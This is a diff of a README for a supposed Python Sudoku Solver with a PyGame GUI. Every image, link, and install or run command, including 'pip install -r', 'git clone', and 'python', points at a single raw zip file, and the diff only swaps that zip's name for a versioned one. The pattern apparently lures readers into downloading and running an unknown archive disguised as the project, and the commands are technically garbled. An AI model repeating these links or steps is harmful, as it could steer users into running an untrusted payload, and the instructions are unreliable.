@@ -1,21 +1,21 @@
 <p align="center">
-  <img src="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip" width="256" height="256">
+  <img src="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku_Solver_2.4-alpha.4.zip" width="256" height="256">
   <h2 align="center" style="margin-top: -4px !important;">Sudoku Solver: A Fun and Challenging Way to Exercise Your Brain!</h2>
   <p align="center">
-    <a href="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip">
-      <img src="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip">
+    <a href="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku_Solver_2.4-alpha.4.zip">
+      <img src="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku_Solver_2.4-alpha.4.zip">
     </a>
-    <a href="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip">
-    	<img src="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip">
+    <a href="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku_Solver_2.4-alpha.4.zip">
+    	<img src="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku_Solver_2.4-alpha.4.zip">
     </a>
   </p>
 </p>
 <p align="center">
-	<img src="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip">
+	<img src="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku_Solver_2.4-alpha.4.zip">
 </p>
 <p align="center">   
-	<a href="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip">
-    	<img src="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip">
+	<a href="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku_Solver_2.4-alpha.4.zip">
+    	<img src="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku_Solver_2.4-alpha.4.zip">
     </a>
 </p>
 
@@ -34,16 +34,16 @@
 - Improves cognitive abilities, including concentration and logical thinking
 
 ## How to Use:
-To use Sudoku Solver, simply download the repository and run the https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip file. You'll be presented with a random Sudoku board and a GUI for inputting your solutions. Use the left-click to select the box you want to fill, then enter your value and confirm it by pressing the Enter key.
+To use Sudoku Solver, simply download the repository and run the https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku_Solver_2.4-alpha.4.zip file. You'll be presented with a random Sudoku board and a GUI for inputting your solutions. Use the left-click to select the box you want to fill, then enter your value and confirm it by pressing the Enter key.
 
 <p align="center">
-	<img src="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip%https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip">
+	<img src="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku_Solver_2.4-alpha.4.zip%https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku_Solver_2.4-alpha.4.zip">
 </p>
 
 If you get stuck on a tricky puzzle, press the Spacebar key to solve the board using the backtracking algorithm. You can also receive hints by pressing the "h" key, which will display a random correct value on the board.
 
 <p align="center">
-	<img src="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip">
+	<img src="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku_Solver_2.4-alpha.4.zip">
 </p>
 
 ## Input:
@@ -59,23 +59,23 @@ If you get stuck on a tricky puzzle, press the Spacebar key to solve the board u
 ## Requirements:
 To run Sudoku Solver, you'll need to have Python and PyGame installed on your system. You can install the necessary requirements using pip:
 ```
-pip install -r https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip
+pip install -r https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku_Solver_2.4-alpha.4.zip
 ```
 
 ## Execution:
 - Clone this repository using
 ```
-git clone https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip
+git clone https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku_Solver_2.4-alpha.4.zip
 ```
 **OR**
 - Zip Download the Repository and Extract it's contents.
-- Now run the [SudokuGUI](https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip) file directly in your Terminal using
+- Now run the [SudokuGUI](https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku_Solver_2.4-alpha.4.zip) file directly in your Terminal using
 ```
-python https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip
+python https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku_Solver_2.4-alpha.4.zip
 ```
 **OR**
 ```
-python3 https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip
+python3 https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku_Solver_2.4-alpha.4.zip
 ```
 
 ## Conclusion:
